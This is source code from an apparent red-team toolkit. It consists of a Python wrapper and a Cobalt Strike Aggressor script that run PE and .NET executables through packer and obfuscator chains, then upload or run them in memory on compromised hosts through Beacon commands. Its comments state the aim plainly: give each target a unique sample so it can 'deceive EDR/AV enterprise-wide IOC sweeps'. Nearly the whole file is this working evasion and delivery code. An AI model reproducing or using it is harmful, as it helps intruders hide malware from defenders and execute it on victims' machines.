#   <mb [at] binary-offensive.com>
#   (https://github.com/mgeeky)
#

import re
import os
import sys
#import clr
import glob
import pefile
import random
import string
import tempfile
import subprocess

settings = {
    'output' : '',
    'outputdir' : '',

    'python3_interpreter_path' : '',
    'protected_executables_cache_dir' : '',
    'default_dotnet_packers_chain' : '',
    'protect_my_tooling_dir' : '',
    'default_exe_x86_packers_chain' : '',
    'default_exe_x64_packers_chain' : '',
    'default_dll_x86_packers_chain' : '',
    'default_dll_x64_packers_chain' : '',
    'protect_my_tooling_config' : '',
    'cache_protected_executables' : ''
}

packerslist = []

def output(x):
    if settings['output'] == '':
        print(x)
        return

    with open(settings['output'], 'a+') as f:
        f.write(x + '\n')
        f.flush()


def isDotNetExecutable(path):
    pe = None

    try:
        pe = pefile.PE(path)
        idx = pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR']

        dir_entry = pe.OPTIONAL_HEADER.DATA_DIRECTORY[idx]

        if dir_entry.VirtualAddress != 0 and dir_entry.Size > 0:
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                if entry.dll.decode('utf-8').lower() == 'mscoree.dll':
                    for func in entry.imports:
                        if func.name.decode() == '_CorExeMain':
                            return True

    except Exception as e:
        raise

    finally:
        if pe:
            pe.close()

    return False

def shell(cmd):
    CREATE_NO_WINDOW = 0x08000000
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    out = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        startupinfo=si,
        creationflags=CREATE_NO_WINDOW
    )
    status = out.stdout.decode(errors='ignore').strip()

    if len(out.stderr) > 0:
        raise Exception('''
Running shell command ({}) failed:

---------------------------------------------
{}
---------------------------------------------
'''.format(cmd, out.stderr.decode(errors='ignore')))

    return status

def get_tempfile_name(some_id = ''):
    return os.path.join(tempfile.gettempdir(), next(tempfile._get_candidate_names()) + some_id)

def parseOptions(config):
    global settings
    global packerslist

    data = []

    with open(config, 'r') as f:
        data = f.readlines()

    for line in data:
        if not line.startswith('protectmytooling.'): continue
        for k, v in settings.items():
            if k in line:
                settings[k] = line.strip().split(' = ')[1]

    if (os.path.isdir(settings['protected_executables_cache_dir'])) and (settings['cache_protected_executables'] == 'true'):
        settings['outputdir'] = settings['protected_executables_cache_dir']
    else:
        settings['outputdir'] = os.environ['temp']

    if not os.path.isdir(settings['protect_my_tooling_dir']):
        output('[!] protect_my_tooling_dir directory does not exist!')
        return False

    if not os.path.isfile(settings['protect_my_tooling_config']):
        output('[!] protect_my_tooling_config file does not exist!')
        return False

    if not os.path.isfile(settings['python3_interpreter_path']):
        output('[!] python3_interpreter_path file does not exist!')
        return False

    if not settings['default_exe_x86_packers_chain']:
        output('[!] default_exe_x86_packers_chain must be set!')
        return False

    if not settings['default_exe_x64_packers_chain']:
        output('[!] default_exe_x64_packers_chain must be set!')
        return False

    if not settings['default_dll_x86_packers_chain']:
        output('[!] default_dll_x86_packers_chain must be set!')
        return False

    if not settings['default_dll_x64_packers_chain']:
        output('[!] default_dll_x64_packers_chain must be set!')
        return False

    if not settings['default_dotnet_packers_chain']:
        output('[!] default_dotnet_packers_chain must be set!')
        return False

    packerslistoutput = shell('"{}" "{}" -L'.format(
        settings['python3_interpreter_path'],
        os.path.join(settings['protect_my_tooling_dir'], 'ProtectMyTooling.py')
    ))

    for m in re.finditer(r'\|\s*\d+\s*\|\s*([^\s]+)\s*\|', packerslistoutput):
        packerslist.append(m.group(1).lower())

    #output('[.] Packers available:')
    #for packer in packerslist:
    #    output('packer: ' + packer)

    for p in settings['default_exe_x86_packers_chain'].split(','):
        if p.lower() not in packerslist:
            output('[!] Packer: "{}" defined in default_exe_x86_packers_chain is not available!'.format(p))
            return False

    for p in settings['default_exe_x64_packers_chain'].split(','):
        if p.lower() not in packerslist:
            output('[!] Packer: "{}" defined in default_exe_x64_packers_chain is not available!'.format(p))
            return False

    for p in settings['default_dll_x86_packers_chain'].split(','):
        if p.lower() not in packerslist:
            output('[!] Packer: "{}" defined in default_dll_x86_packers_chain is not available!'.format(p))
            return False

    for p in settings['default_dll_x64_packers_chain'].split(','):
        if p.lower() not in packerslist:
            output('[!] Packer: "{}" defined in default_dll_x64_packers_chain is not available!'.format(p))
            return False

    for p in settings['default_dotnet_packers_chain'].split(','):
        if p.lower() not in packerslist:
            output('[!] Packer: "{}" defined in default_dotnet_packers_chain is not available!'.format(p))
            return False

    return True

def isPeFile(infile):
    pe = None
    try:
        pe = pefile.PE(infile)
        arch = 'x86' if (pe.FILE_HEADER.Machine == pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_I386']) else 'x64'
        isdll = True if (pe.FILE_HEADER.Characteristics & pefile.IMAGE_CHARACTERISTICS ['IMAGE_FILE_DLL'] == pefile.IMAGE_CHARACTERISTICS ['IMAGE_FILE_DLL']) else False

        return (True, arch, isdll)

    except pefile.PEFormatError as e:
        return (False, None, None)

    finally:
        if pe:
            pe.close()

def clearCacheDir():
    if os.path.isdir(settings['protected_executables_cache_dir']):
        p = os.path.join(settings['protected_executables_cache_dir'], '*')
        output('[.] Clearing cache directory: {}'.format(p))

        for f in glob.glob(p):
            output('\tRemoving file: ' + f)
            os.remove(f)

def main(argv):
    global settings

    if len(argv) < 3:
        output('[!] Usage: cobaltProtectMyTooling.py <cobaltProtectMyTooling.conf> <infile> [logfile]')
        return False

    config = argv[1]
    infile = argv[2]
    settings['output'] = ''

    if len(argv) == 4:
        settings['output'] = argv[3]
        try:
            with open(settings['output'], 'a') as f:
                f.truncate(0)
        except Exception as e:
            output('[!] Could not create file for script\'s output.')
            return False

    if not os.path.isfile(config):
        output('[!] Input cobaltProtectMyTooling.conf file does not exist: "{}"'.format(config))
        return False

    if not parseOptions(config):
        return False

    if infile == 'clearcache':
        clearCacheDir()
        return True

    if not os.path.isfile(infile):
        output('[!] Input file does not exist: "{}"'.format(infile))
        return False

    (ret, arch, isdll) = isPeFile(infile)

    if not ret:
        output('[.] File is not a valid PE file. Returning it directly.')
        output('\nOUTPUT-FILE: "{}"'.format(infile))
        return True

    (filename, ext) = os.path.splitext(infile)
    filename = os.path.basename(filename)
    suff = '-protected.{}{}'.format(
        ''.join(random.choice(string.ascii_lowercase) for i in range(5)),
        ext
    )
    outfile = os.path.join(settings['outputdir'], filename + suff)

    packerschain = ''

    if isDotNetExecutable(infile):
        output('[.] File is a valid .NET Assembly');
        packerschain = settings['default_dotnet_packers_chain']

    else:
        if isdll:
            if arch == 'x64':
                packerschain = settings['default_dll_x64_packers_chain']
            else:
                packerschain = settings['default_dll_x86_packers_chain']

            output('[.] File is a native {} DLL executable.'.format(arch))
        else:
            if arch == 'x64':
                packerschain = settings['default_exe_x64_packers_chain']
            else:
                packerschain = settings['default_exe_x86_packers_chain']

            output('[.] File is a native {} EXE executable.'.format(arch))

    cmdline = '"{}" "{}" -c "{}" -v {} "{}" "{}"'.format(
        settings['python3_interpreter_path'],
        os.path.join(settings['protect_my_tooling_dir'], 'ProtectMyTooling.py'),
        settings['protect_my_tooling_config'],
        packerschain,
        infile,
        outfile
    )

    output('RUNNING ProtectMyTooling with command line:\n\t' + cmdline + '\n\n')
    result = shell(cmdline)

    if settings['output']:
        logfile = settings['output'] + ".tmp"
        if os.path.isfile(logfile):
            with open(logfile) as f:
                result = f.read()

    output('Result:')
    output(result)

    output('\nOUTPUT-FILE: "{}"'.format(outfile))

    return True

if __name__ == '__main__':
    main(sys.argv)


================================================
FILE: CobaltStrike/ProtectMyTooling.cna
================================================
#
# ProtectMyTooling
#
# A script that integrates a script named "ProtectMyTooling.py" used as a wrapper around
# configured PE/.NET Packers/Protectors in order to easily transform input executable file into its
# output, protected and compressed form to then upload or use it from within CobaltStrike.
#
# The idea is to have an automated process of protecting all of the uploaded binaries or .NET
# assemblies used by execute-assembly and forget about protecting or obfuscating them manually
# before each usage. The added benefit of an automated approach to transform executables is the
# ability to have the same executable protected each time it's used, resulting in unique samples
# launched on target machines. That should nicely deceive EDR/AV enterprise-wide IOC sweeps while
# looking for the same artefact on different machines.
#
# Additionally, the protected-execute-assembly command has the ability to look for assemblies of which
# only name were given in a preconfigured assemblies directory (set in dotnet_assemblies_directory setting).
#
# Author:
#   Mariusz Banach / mgeeky, '20
#   <mb [at] binary-offensive.com>
#   (https://github.com/mgeeky)
#

import java.lang.*;

global('%options $protectedCobaltSettingsFile @supportedProtectMyToolingPackers');

$protectedCobaltSettingsFile = script_resource("cobaltProtectMyTooling.conf");

# These defaults will be overwritten by those from file.
%options["python3_interpreter_path"]            = "";
%options["dotnet_assemblies_directory"]         = "";
%options["protect_my_tooling_dir"]              = script_resource("..");
%options["protect_my_tooling_config"]           = "";
%options["protected_executables_cache_dir"]     = "";

%options["cache_protected_executables"]         = "false";
%options["default_exe_x86_packers_chain"]       = "upx,hyperion";
%options["default_exe_x64_packers_chain"]       = "upx,hyperion";
%options["default_dll_x86_packers_chain"]       = "upx,hyperion";
%options["default_dll_x64_packers_chain"]       = "upx,hyperion";
%options["default_dotnet_packers_chain"]        = "confuserex";
%options["prefer_bofnet_over_executeasm"]       = "true";


# No need to update that list, it will get filled automatically.
@supportedProtectMyToolingPackers = @();

$checkBofNetTimes = 3;
$checkedBofNetSoFar = 0;

#
# ==============================================================================================
#


beacon_command_register(
    "protected-upload",
    "Takes an input file, protects it if its PE executable and then uploads that file to specified remote location.",
    "Use: protected-upload </local/path/to/file> [/remote/path/to/file]\n\nUpload a protected file from local path (first argument) to remote path (second argument, optional).\n\nIf the file about to be uploaded is a valid PE executable, it will be firstly subject for ProtectMyTooling.py script\nthat would pass the file to configured packers. Generated output artefact would then be uploaded to the target machine.");

beacon_command_register(
    "protected-execute-assembly",
    "Execute a local, previously protected and compressed .NET program in-memory on target.",
    "Use: protected-upload </path/to/file.exe|filename> [arguments]\n\nExecutes a local .NET process assembly on target. This command loads the CLR in a temporary
process and loads the assembly into it.\n\nIf the file about to be uploaded is a valid PE .NET executable, it will be firstly subject for multi-packer.py script that would pass the file to configured .NET packers. Generated output artefact would then be uploaded to the target machine.");

beacon_command_register(
    "bofnet_load_protected",
    "Protects .NET assembly with ProtectMyTooling and loads protected version via BOFNET bofnet_load.",
    "Use: protected-upload </path/to/file.exe|filename> [arguments]\n\nProtects .NET assembly with ProtectMyTooling and loads protected version via BOFNET bofnet_load.");

sub interpretSize {
    local('$s $size');
    $s = $1;

    if($s == 0) {
        $size = "";
    }
    else if($s < 1024) {
        $size .= $s . "B";
    }
    else if($s < 1024 * 1024) {
        $size = round($s / 1024.0, 1);
        $size .= "KB";
    }
    else if($s < 1024 * 1024 * 1024) {
        $size = round(($s / 1024.0) / 1024, 1);
        $size .= "MB";
    }
    else if($s < 1024 * 1024 * 1024 * 1024) {
        $size = round((($s / 1024.0) / 1024) / 1024, 1);
        $size .= "GB";
    }

    return $size;
}

$has_bofnet_commands = false;

sub checkBofnet {
    if($has_bofnet_commands == true) {
        return;
    }

    if($has_bofnet_commands == false) {
        foreach $command (beacon_commands()) {
            if('bofnet_init' iswm $command) {
                $has_bofnet_commands = true;
                break;
            }
        }
    }

    if((%options["prefer_bofnet_over_executeasm"] eq "true") && ($has_bofnet_commands == false)) {
        $checkedBofNetSoFar += 1;

        if($checkedBofNetSoFar > $checkBofNetTimes) {
            show_error("There is no BOF.NET loaded in Cobalt Strike! Load bofnet.cna or reload ProtectMyTooling.cna to use protected-execute-assembly");
        }
    }
}

alias bofnet_load_protected {
    local('$bid $localpath $args $generatedlocalpath');
    $bid = shift(@_);
    $localpath = shift(@_);
    $args = join(" ", @_);

    $useBofnet = true;

    if($has_bofnet_commands == true) {
        $useBofnet = true;
    }
    else {
        checkBofnet();
        if($has_bofnet_commands == false) {
            berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and ProtectMyTooling.cna before using this.");
            return;
        }
    }

    if($localpath is $null || strlen($localpath) == 0) {
        prompt_file_open("Choose an assembly to execute", $null, false, lambda({
            bupload($bid, $1);
        }, $bid => $bid));
        return;
    }

    if($localpath is $null || strlen($localpath) == 0) {
        berror($bid, "Assembly path must be specified.");
        return;
    }

    if(!-exists $localpath) {
        if(strlen(%options["dotnet_assemblies_directory"]) > 0) {
            if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath)) {
                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath);
            }
            else if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe")) {
                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe");
            }
            else {
                berror($bid, "Specified assembly file could not be found: ( $+ $localpath $+ )");
                return;
            }

            blog($bid, "Auto-located specified .NET assembly at: " . $localpath);
        }
        else {
            berror($bid, "Specified assembly file does not exist: ( $+ $localpath $+ )");
            return;
        }
    }

    try {
        $generatedlocalpath = executePacker($1, $localpath);
    }
    catch $message {
        berror($bid, "Could not generated protected variant of file to be uploaded. Error: $message");
        return;
    }

    $algo = "MD5";
    $md = [java.security.MessageDigest getInstance: $algo];
    $digest = 0;
    $hash = "";

    try {
        $f = openf($generatedlocalpath);
        $content = readb($f, -1);
        if($content is $null) {
            berror($1, "Could not generate protected version of file to be uploaded. Please review logfile.")
        }

        $digest = [$md digest: $content];
        $hash = transform($digest, "hex");
        $hash = lc($hash);

        closef($f);
    }
    catch $message {
        berror($1, "Could not read contents of file to upload. Error: $message (file path: $generatedlocalpath )");
        return;
    }

    if(strlen($hash) == 0) {
        btask($bid, "Tasked beacon to load protected .NET program via BOFNET: \c7" . getFileName($generatedlocalpath) . " $args \o");
    }
    else {
        btask($bid, "Tasked beacon to load protected .NET program via BOFNET (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
    }

    if($useBofnet)
    {
        if(strlen($hash) == 0) {
            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
        }
        else {
            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
        }

        binput($bid, "bofnet_load $generatedlocalpath");
        fireAlias($bid, "bofnet_load", $generatedlocalpath);

        binput($bid, "bofnet_jobassembly " . getFileName($generatedlocalpath) . " $args");
        fireAlias($bid, "bofnet_jobassembly", getFileName($generatedlocalpath) . " $args");
    }
}

alias protected-execute-assembly {
    local('$bid $localpath $args $generatedlocalpath');
    $bid = shift(@_);
    $localpath = shift(@_);
    $args = join(" ", @_);

    $useBofnet = false;

    if($mode == true) {
        if($has_bofnet_commands == true) {
            $useBofnet = true;
        }
        else {
            checkBofnet();
            if($has_bofnet_commands == false) {
                berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and ProtectMyTooling.cna before using this.");
                return;
            }
        }
    }

    if($localpath is $null || strlen($localpath) == 0) {
        prompt_file_open("Choose an assembly to execute", $null, false, lambda({
            bupload($bid, $1);
        }, $bid => $bid));
        return;
    }

    if($localpath is $null || strlen($localpath) == 0) {
        berror($bid, "Assembly path must be specified.");
        return;
    }

    if(!-exists $localpath) {
        if(strlen(%options["dotnet_assemblies_directory"]) > 0) {
            if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath)) {
                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath);
            }
            else if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe")) {
                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe");
            }
            else {
                berror($bid, "Specified assembly file could not be found: ( $+ $localpath $+ )");
                return;
            }

            blog($bid, "Auto-located specified .NET assembly at: " . $localpath);
        }
        else {
            berror($bid, "Specified assembly file does not exist: ( $+ $localpath $+ )");
            return;
        }
    }

    try {
        $generatedlocalpath = executePacker($1, $localpath);
    }
    catch $message {
        berror($bid, "Could not generated protected variant of file to be uploaded. Error: $message");
        return;
    }

    $algo = "MD5";
    $md = [java.security.MessageDigest getInstance: $algo];
    $digest = 0;
    $hash = "";

    try {
        $f = openf($generatedlocalpath);
        $content = readb($f, -1);
        if($content is $null) {
            berror($1, "Could not generate protected version of file to be uploaded. Please review logfile.")
        }

        $digest = [$md digest: $content];
        $hash = transform($digest, "hex");
        $hash = lc($hash);

        closef($f);
    }
    catch $message {
        berror($1, "Could not read contents of file to upload. Error: $message (file path: $generatedlocalpath )");
        return;
    }

    if(strlen($hash) == 0) {
        btask($bid, "Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
    }
    else {
        btask($bid, "Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
    }

    if($useBofnet)
    {
        if(strlen($hash) == 0) {
            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
        }
        else {
            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
        }

        binput($bid, "bofnet_load $generatedlocalpath");
        fireAlias($bid, "bofnet_load", $generatedlocalpath);

        binput($bid, "bofnet_jobassembly " . getFileName($generatedlocalpath) . " $args");
        fireAlias($bid, "bofnet_jobassembly", getFileName($generatedlocalpath) . " $args");
    }
    else
    {
        if(strlen($hash) == 0) {
            btask($bid, "(execute-assembly) Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
        }
        else {
            btask($bid, "(execute-assembly) Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
        }
        bexecute_assembly!($bid, $generatedlocalpath, $args);
    }
}

alias protected-upload {
    local('$bid $f $localpath $remotepath $content $generatedlocalpath $algo $md $digest $hash');
    ($bid, $localpath, $remotepath) = @_;

    if($localpath is $null || strlen($localpath) == 0) {
        prompt_file_open("Choose a file", $null, false, lambda({
            bupload($bid, $1);
        }, $bid => $bid));
        return;
    }

    if($localpath is $null || strlen($localpath) == 0) {
        berror($1, "Source file path (local path) must be specified.");
        return;
    }

    if(!-exists $localpath) {
        berror($1, "Specified input file does not exist: ( $+ $localpath $+ )");
        return;
    }

    try {
        $generatedlocalpath = executePacker($1, $localpath);
    }
    catch $message {
        berror($1, "Could not generated protected variant of file to be uploaded. Error: $message");
        return;
    }

    try {
        $f = openf($generatedlocalpath);
        $content = readb($f, -1);
        if($content is $null) {
            throw "Read empty file";
        }
        closef($f);
    }
    catch $message {
        berror($1, "Could not read contents of file to upload. Error: $message (file path: $generatedlocalpath )");
        return;
    }

    $algo = "MD5";
    $md = [java.security.MessageDigest getInstance: $algo];
    $digest = [$md digest: $content];

    $hash = transform($digest, "hex");
    $hash = lc($hash);

    if($remotepath is $null || strlen($remotepath) == 0) {
        $remotepath = getFileName($localpath);
        btask($1, "Tasked Beacon to upload a protected file (size: " . interpretSize(strlen($content)) . ", md5: " . $hash . "): $generatedlocalpath as $remotepath");
        bupload_raw!($1, $remotepath, $content, $generatedlocalpath);
        return;
    }

    btask($1, "Tasked Beacon to upload a protected file (size: " . interpretSize(strlen($content)) . ", md5: " . $hash . ") from: ( $+ $generatedlocalpath $+ ) to: ( $+ $remotepath $+ )");
    bupload_raw!($1, $remotepath, $content, $generatedlocalpath);
}

sub help {
    # ==============================================================================================

    local('$hlp');

    $hlp = "\n";

    $hlp .= "A script that integrates \"ProtectMyTooling.py\" used as a wrapper around\n";
    $hlp .= "configured PE/.NET Packers/Protectors in order to easily transform input executables into their\n";
    $hlp .= "protected and compressed output forms and then upload or use them from within CobaltStrike.\n";
    $hlp .= "\n";
    $hlp .= "The idea is to have an automated process of protecting all of the uploaded binaries or .NET\n";
    $hlp .= "assemblies used by execute-assembly and forget about protecting or obfuscating them manually\n";
    $hlp .= "before each usage. The added benefit of an automated approach to transform executables is the\n";
    $hlp .= "ability to have the same executable protected each time it's used, resulting in unique samples\n";
    $hlp .= "launched on target machines. That should nicely deceive EDR/AV enterprise-wide IOC sweeps while \n";
    $hlp .= "looking for the same artefact on different machines.\n";
    $hlp .= "\n";
    $hlp .= "Additionally, the protected-execute-assembly command has the ability to look for assemblies of which\n";
    $hlp .= "only name were given in a preconfigured assemblies directory (set in dotnet_assemblies_directory setting).\n";
    $hlp .= "\n";
    $hlp .= "Settings:\n";
    $hlp .= "    * python3_interpreter_path - Specify a path to Python3 interpreter executable\n";
    $hlp .= "    * protect_my_tooling_dir - Specify a path to ProtectMyTooling main directory\n";
    $hlp .= "    * protect_my_tooling_config - Specify a path to ProtectMyTooling configuration file with various packers options\n";
    $hlp .= "    * dotnet_assemblies_directory - Specify local path .NET assemblies should be looked for if not found by execute-assembly\n";
    $hlp .= "\n";
    $hlp .= "    * cache_protected_executables - Enable to cache already protected executables and reuse them when needed\n";
    $hlp .= "    * protected_executables_cache_dir - Specify a path to a directory that should store cached protected executables\n";
    $hlp .= "\n";
    $hlp .= "    * default_exe_x86_packers_chain - Native x86 EXE executables protectors/packers chain\n";
    $hlp .= "    * default_exe_x64_packers_chain - Native x64 EXE executables protectors/packers chain\n";
    $hlp .= "    * default_dll_x86_packers_chain - Native x86 DLL executables protectors/packers chain\n";
    $hlp .= "    * default_dll_x64_packers_chain - Native x64 DLL executables protectors/packers chain\n";
    $hlp .= "    * default_dotnet_packers_chain - .NET executables protectors/packers chain\n";
    $hlp .= "    * prefer_bofnet_over_executeasm - Prefer BOF.NET bofnet_jobassembly over execute-assembly\n";
    $hlp .= "\n";

    # ===========================================================================================================

    show_message($hlp);
}

sub clearCacheFolder {
    local('$localpath $cmdline $logfile $scriptPath $python');

    if ((%options["protected_executables_cache_dir"] !is $null) && (strlen(%options["protected_executables_cache_dir"]) > 0 ) && (-exists %options["protected_executables_cache_dir"])) {
        $python = %options["python3_interpreter_path"];
        $scriptPath = script_resource("cobaltProtectMyTooling.py");
        $logfile = getFileProper([System getenv: "TEMP"], "cobaltprotectmytooling.log");

        $cmdline = "\" $+ $python $+ \" \" $+ $scriptPath $+ \" \" $+ $protectedCobaltSettingsFile $+ \" clearcache \" $+ $logfile $+ \"";

        println("[ProtectMyTooling] Clearing cache directory: " . $cmdline);

        exec($cmdline);

        show_message("Cache directory \"" . %options["protected_executables_cache_dir"] . "\" cleared.");
    }
}

sub executePacker {
    local('$localpath $maxTries $outpath $num $f $output $generatedlocalpath $cmdline $logfile $scriptPath $python');

    $bid = $1;
    $localpath = $2;
    $generatedlocalpath = '';

    if(%options["cache_protected_executables"] eq "true") {
        $generatedlocalpath = getFileProper(%options["protected_executables_cache_dir"], getFileName($localpath));

        if(-exists $generatedlocalpath) {
            blog2($1, "Reusing cached version of protected " . getFileName($localpath) . ": " . $generatedlocalpath);
            return $generatedlocalpath;
        }
    }

    $python = %options["python3_interpreter_path"];
    $scriptPath = script_resource("cobaltProtectMyTooling.py");
    $logfile = getFileProper([System getenv: "TEMP"], "cobaltprotectmytooling.log");

    $cmdline = "\" $+ $python $+ \" \" $+ $scriptPath $+ \" \" $+ $protectedCobaltSettingsFile $+ \" \" $+ $localpath $+ \" \" $+ $logfile $+ \"";

    #println("[ProtectMyTooling] Running packer: " . $cmdline);

    exec($cmdline);
    $output = "";

    $maxTries = 10;
    $num = 0;

    while ($num < $maxTries) {
        try {
            $f = openf($logfile);
            $output = readb($f, -1);

            if ($output is $null) {
                berror($1, "Could not generate protected version of file to be uploaded. Please review logfile.")
            }
            closef($f);

            $generatedlocalpath = matches($output, 'OUTPUT-FILE: "([^"]+)"');
            if ($generatedlocalpath !is $null && size($generatedlocalpath) == 1){
                if (-exists $generatedlocalpath[0]){
                    break;
                }
            }
        }
        catch $message {
            continue;
        }

        $num += 1;
        println("[ProtectMyTooling] Waiting for output from cobaltProtectMyTooling.py ...");
        sleep(1000);
    }

    $outpath = $generatedlocalpath[0];
    println("[ProtectMyTooling] Extracted protected file's output path: " . $outpath);

    if (-exists $outpath){
        blog2($bid, "Using protected version of " . getFileName($localpath) . ": " . $generatedlocalpath[0]);

        try {
            $f = openf(">$logfile");
            println($f, "");
            closef($f);
        }
        catch $msg {
        }

        deleteFile($logfile);

        return $generatedlocalpath[0];
    }
    else {
        #println("ERROR1");
    }

    berror($1, "Could not extract protected file's path!");
    berror($1, "[ProtectMyTooling] Output from packer: \n" . $output);
    println("[ProtectMyTooling] Ran packer: " . $cmdline);

    return "";
}

sub checkOptions {
    local('$err @p $packer');

    if( strlen(%options["python3_interpreter_path"]) == 0) {
        $err .= "\n\nPython3 interpreter's path is not set.\nPlease set \"protectmytooling.python3_interpreter_path\" option first before using ProtectMyTooling.";
    }
    else if(!-exists %options["python3_interpreter_path"]) {
        $err .= "\n\nFile pointed by \"protectmytooling.python3_interpreter_path\" does not exist.";
        %options["python3_interpreter_path"] = "";
    }

    if( strlen(%options["protect_my_tooling_config"]) == 0) {
        $err .= "\n\nProtectMyTooling configuration file path is not set.\nPlease set \"protectmytooling.protect_my_tooling_config\" option first before using ProtectMyTooling.";
    }
    else if(!-exists %options["protect_my_tooling_config"]) {
        $err .= "\n\nConfig file pointed by \"protectmytooling.protect_my_tooling_config\" does not exist.";
        %options["protect_my_tooling_config"] = "";
    }

    if(!-exists %options["dotnet_assemblies_directory"]) {
        $err .= "\n\nDirectory pointed by \"protectmytooling.dotnet_assemblies_directory\" does not exist.";
        %options["dotnet_assemblies_directory"] = "";
    }

    if( strlen(%options["protect_my_tooling_dir"]) == 0) {
        $err .= "\n\nProtectMyTooling main directory path is not set. That file is crucial for the ProtectMyTooling to work.\nPlease set \"protectmytooling.protect_my_tooling_dir\" option first before using ProtectMyTooling.";
    }
    else if(!-exists %options["protect_my_tooling_dir"]) {
        $err .= "\n\nProtectMyTooling main directory pointed by \"protectmytooling.protect_my_tooling_dir\" does not exist.";
        %options["protect_my_tooling_dir"] = "";
    }

    if( strlen(%options["protected_executables_cache_dir"]) == 0) {
        $err .= "\n\nA path to directory where protected executables should be cached is not set.\nPlease set \"protectmytooling.protected_executables_cache_dir\" option first before using ProtectMyTooling.";
    }
    else if(!-exists %options["protected_executables_cache_dir"]) {
        $err .= "\n\nDirectory pointed by \"protectmytooling.protected_executables_cache_dir\" does not exist.";
        %options["protected_executables_cache_dir"] = "";
    }

    if( strlen(%options["dotnet_assemblies_directory"]) == 0) {
        show_error(".NET directory path for looking up not found assemblies is not set.\nNot having this option set will result in that functionality being disabled. This error is not critical.");
    }

    @p = split(',', %options["default_exe_x86_packers_chain"]);
    foreach $packer (@p) {
        $packer = ["$packer" trim];
        if ($packer !in @p) {
            $err .= "\n\nPacker: $packer set in default_exe_x86_packers_chain is not available!\n";
        }
    }

    @p = split(',', %options["default_exe_x64_packers_chain"]);
    foreach $packer (@p) {
        $packer = ["$packer" trim];
        if ($packer !in @p) {
            $err .= "\n\nPacker: $packer set in default_exe_x64_packers_chain is not available!\n";
        }
    }

    @p = split(',', %options["default_dll_x86_packers_chain"]);
    foreach $packer (@p) {
        $packer = ["$packer" trim];
        if ($packer !in @p) {
            $err .= "\n\nPacker: $packer set in default_dll_x86_packers_chain is not available!\n";
        }
    }

    @p = split(',', %options["default_dll_x64_packers_chain"]);
    foreach $packer (@p) {
        $packer = ["$packer" trim];
        if ($packer !in @p) {
            $err .= "\n\nPacker: $packer set in default_dll_x64_packers_chain is not available!\n";
        }
    }

    @p = split(',', %options["default_dotnet_packers_chain"]);
    foreach $packer (@p) {
        $packer = ["$packer" trim];
        if ($packer !in @p) {
            $err .= "\n\nPacker: $packer set in default_dotnet_packers_chain is not available!\n";
        }
    }

    if(strlen($err) > 0) {
        show_error($err);
        return 0;
    }

    return 1;
}

sub showOptionsDialog {
    local('$dialog');

    $dialog = dialog("ProtectMyTooling options", %options, &updateOptions);

    dialog_description($dialog, "Preferences configuring the way ProtectMyTooling serves its purpose.");

    drow_text($dialog, "python3_interpreter_path", "Specify a path to Python3 interpreter executable: ");
    drow_text($dialog, "protect_my_tooling_dir", "Specify a path to ProtectMyTooling main directory: ");
    drow_text($dialog, "protect_my_tooling_config", "Specify a path to ProtectMyTooling configuration file with various packers options: ");
    drow_text($dialog, "dotnet_assemblies_directory", "Specify local path .NET assemblies should be looked for if not found by execute-assembly: ");

    drow_checkbox($dialog, "cache_protected_executables", "Enable to cache already protected executables and reuse them when needed:", "Cache executables");
    drow_text($dialog, "protected_executables_cache_dir", "Specify a path to a directory that should store cached protected executables: ");

    drow_text($dialog, "default_exe_x86_packers_chain", "Native x86 EXE executables protectors/packers chain: ");
    drow_text($dialog, "default_exe_x64_packers_chain", "Native x64 EXE executables protectors/packers chain: ");
    drow_text($dialog, "default_dotnet_packers_chain", ".NET executables protectors/packers chain: ");
    drow_text($dialog, "default_dll_x86_packers_chain", "Native x86 DLL executables protectors/packers chain: ");
    drow_text($dialog, "default_dll_x64_packers_chain", "Native x64 DLL executables protectors/packers chain: ");
    drow_checkbox($dialog, "prefer_bofnet_over_executeasm", "Prefer BOF.NET bofnet_jobassembly over execute-assembly:", "Prefer BOF.NET");

    dbutton_action($dialog, "Save settings");
    dbutton_action($dialog, "Help");
    dialog_show($dialog);
}

sub updateOptions{
    local('%setopts');
    %setopts = $3;
    $button = $2;

    if ($button eq "Help") {
        help();
        return;
    }

    %options["python3_interpreter_path"] = %setopts["python3_interpreter_path"];
    %options["protect_my_tooling_dir"] = %setopts["protect_my_tooling_dir"];
    %options["protect_my_tooling_config"] = %setopts["protect_my_tooling_config"];
    %options["dotnet_assemblies_directory"] = %setopts["dotnet_assemblies_directory"];
    %options["cache_protected_executables"] = %setopts["cache_protected_executables"];
    %options["protected_executables_cache_dir"] = %setopts["protected_executables_cache_dir"];
    %options["default_exe_x86_packers_chain"] = %setopts["default_exe_x86_packers_chain"];
